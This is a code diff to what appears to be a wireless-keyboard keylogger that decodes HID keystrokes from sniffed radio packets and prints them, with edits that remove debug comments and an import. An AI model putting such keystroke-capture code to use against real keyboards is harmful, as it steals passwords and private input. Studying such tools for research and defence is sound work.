@@ -1,7 +1,6 @@
 # -*- coding: utf-8 -*-
 
 import sys
-import mousejack
 import duckyparser
 from plugins import microsoft_enc
 
@@ -43,25 +42,17 @@ class KeyLogger(object):
             sequence = (payload[5] << 8) + payload[4]
 
             if sequence < self.last_sequence and (self.last_sequence - sequence) > 1000:
-                #print "sequence numbers wrapped - oseq: %d nseq: %d" % (self.last_sequence, sequence)
                 self.last_sequence = sequence - 1
-
-            elif sequence < self.last_sequence:
-                key = payload[9]
-                if key != self.last_key:
-                    #print "missed key? oseq: %d nseq: %d key: %s" % (self.last_sequence, sequence, self.hid_decode(key, payload[7]))
-                    pass
 
             if sequence > self.last_sequence:
                 self.last_sequence = sequence
                 key = payload[9]
-                
+
                 if not (key == self.last_key and (payload[10] or payload[11])):
                     self.last_key = key
                     letter = self.hid_decode(key, payload[7])
 
                     if letter:
-                        #print "addr: %s seq: %d key: %s" % (self.jack.to_display(address), sequence, letter)
                         sys.stdout.write(letter)
                         sys.stdout.flush()
 
